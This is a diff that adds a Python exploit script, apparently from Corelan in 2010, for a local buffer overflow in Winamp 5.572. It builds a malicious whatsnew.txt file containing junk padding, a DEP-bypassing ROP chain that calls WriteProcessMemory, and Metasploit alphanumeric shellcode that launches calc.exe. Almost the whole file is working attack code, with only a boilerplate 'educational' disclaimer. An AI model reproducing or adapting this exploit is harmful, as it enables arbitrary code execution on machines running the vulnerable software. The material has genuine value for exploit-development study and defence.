@@ -1,0 +1,112 @@
+#!/usr/bin/python
+#
+# Title:                Winamp v5.572 local BOF exploit (EIP & SEH DEP Bypass)
+# Author:               Rocco Calvi aka TecR0c - http://tecninja.net/blog | http://twitter.com/TecR0c
+# Found BY:             Debug
+# Date:                 June 18th, 2010
+# Platform:             Windows XP sp3 En
+# Greetz to:            Corelan Security Team
+# http://www.corelan.be:8800/index.php/security/corelan-team-members/
+#
+# Script provided 'as is', without any warranty.
+# Use for educational purposes only.
+# Do not use this code to do anything illegal !
+#
+# Note : you are not allowed to edit/modify this code.
+# If you do, Corelan cannot be held responsible for any damages this may cause.
+
+# Special thanks to mr_me for making me try harder and lincoln
+
+
+# Usage stage 1 : Replace existing whatsnew.txt file with evil whatsnew.txt 
+
+# Usage stage 2 : Launch Application > Help > About Winamp > Version History > BOOM!
+
+ 
+print "|------------------------------------------------------------------|"
+print "|                         __               __                      |"
+print "|   _________  ________  / /___ _____     / /____  ____ _____ ___  |"
+print "|  / ___/ __ \/ ___/ _ \/ / __ `/ __ \   / __/ _ \/ __ `/ __ `__ \ |"
+print "| / /__/ /_/ / /  /  __/ / /_/ / / / /  / /_/  __/ /_/ / / / / / / |"
+print "| \___/\____/_/   \___/_/\__,_/_/ /_/   \__/\___/\__,_/_/ /_/ /_/  |"
+print "|                                                                  |"
+print "|                                       http://www.corelan.be:8800 |"
+print "|                                              security@corelan.be |"
+print "|                                                                  |"
+print "|-------------------------------------------------[ EIP Hunters ]--|"
+print "[+] Winamp 5.572 (whatnews.txt) DEP Bypass - by TecR0c"
+
+
+
+# http://www.metasploit.com
+# EXITFUNC=process, CMD=calc.exe
+sc = ("\x89\xe1\xd9\xee\xd9\x71\xf4\x58\x50\x59\x49\x49\x49\x49"
+"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56"
+"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41"
+"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42"
+"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a"
+"\x48\x47\x34\x43\x30\x45\x50\x45\x50\x4c\x4b\x51\x55\x47"
+"\x4c\x4c\x4b\x43\x4c\x45\x55\x42\x58\x45\x51\x4a\x4f\x4c"
+"\x4b\x50\x4f\x45\x48\x4c\x4b\x51\x4f\x51\x30\x43\x31\x4a"
+"\x4b\x51\x59\x4c\x4b\x50\x34\x4c\x4b\x43\x31\x4a\x4e\x46"
+"\x51\x49\x50\x4c\x59\x4e\x4c\x4d\x54\x49\x50\x42\x54\x45"
+"\x57\x49\x51\x49\x5a\x44\x4d\x43\x31\x48\x42\x4a\x4b\x4c"
+"\x34\x47\x4b\x50\x54\x47\x54\x45\x54\x43\x45\x4b\x55\x4c"
+"\x4b\x51\x4f\x47\x54\x45\x51\x4a\x4b\x45\x36\x4c\x4b\x44"
+"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x43\x31\x4a\x4b\x4c"
+"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4c\x49\x51\x4c\x46"
+"\x44\x44\x44\x48\x43\x51\x4f\x50\x31\x4a\x56\x45\x30\x50"
+"\x56\x42\x44\x4c\x4b\x51\x56\x50\x30\x4c\x4b\x51\x50\x44"
+"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x43\x58\x45"
+"\x58\x4b\x39\x4a\x58\x4d\x53\x49\x50\x42\x4a\x50\x50\x43"
+"\x58\x4a\x50\x4d\x5a\x44\x44\x51\x4f\x45\x38\x4a\x38\x4b"
+"\x4e\x4c\x4a\x44\x4e\x50\x57\x4b\x4f\x4d\x37\x42\x43\x43"
+"\x51\x42\x4c\x42\x43\x43\x30\x41\x41");
+
+
+version = "Winamp 5.572"
+
+rop = "\x41" * 540          # Crash
+
+
+rop += "\x09\x12\x0e\x07"   # 0x070E1209 :  {POP}  # POP EDI # POP ESI # POP EBP
+                            # XOR EAX,EAX # POP EBX # RETN               	[Module : nde.dll] 
+
+
+rop += "\xee\xff\xff\xc0"   # 0xc0ffffee :  Junk
+rop += "\xee\xff\xff\xc0"   # 0xc0ffffee :  Junk
+rop += "\xee\xff\xff\xc0"   # 0xc0ffffee :  Junk
+rop += "\xee\xff\xff\xc0"   # 0xc0ffffee :  Junk
+
+
+rop += "\x03\x85\x09\x07"   # 0x07098503 :  EAX CALL   
+rop += "\xee\xff\xff\xc0"   # 0xc0ffffee :  Junk
+rop += "\xee\xff\xff\xc0"   # 0xc0ffffee :  Junk
+rop += "\xff\xff\xff\xff"   # 0xffffffff :  for EBX
+
+
+rop += "\xc5\x01\x5a\x78"   # 0x785A01C5 :  # POP EDX # RETN 	                [Module : MSVCR90.dll] 
+rop += "\x10\xe0\x10\x07"   # 0x07100e01 :  Writeable Address
+
+
+rop += "\x46\x17\x5a\x78"   # 0x785A1746 :  # ADD EAX,40 # POP EBP # RETN 	[Module : MSVCR90.dll]
+rop += "\xee\xff\xff\xc0"   # 0xc0ffffee :  Junk
+rop += "\x6e\x22\x97\x7c"   # 0x7C97226E :  # ADD EAX,100 # POP EBP # RETN
+rop += "\xcf\x22\x80\x7c"   # 0x7C8022CF :  dest address in WriteProcessMemory()
+
+
+rop += "\xcf\xc9\x0e\x07"   # 0x070EC9CF :  # ADD EBX,EAX # XOR AL,AL # RETN 	[Module : nde.dll]
+rop += "\x5e\x89\x09\x07"   # 0x0709895E :  {POP}  # POP EAX # POP ESI # RETN 	[Module : libsndfile.dll] 
+rop += "\x13\x22\x80\x7c"   # 0x7C802213 :  WriteProcessMemory 
+rop += "\xff\xff\xff\xff"   # 0xffffffff :  HProcess HANDLE (-1)
+
+
+rop += "\x65\x08\x59\x78"   # 0x78590865 :  # PUSHAD # RETN 	                [Module : MSVCR90.dll] 
+
+
+junk = "\x43" * 800
+
+
+tecfile = open('whatsnew.txt','w')
+tecfile.write(version + rop + sc + junk)
+tecfile.close()
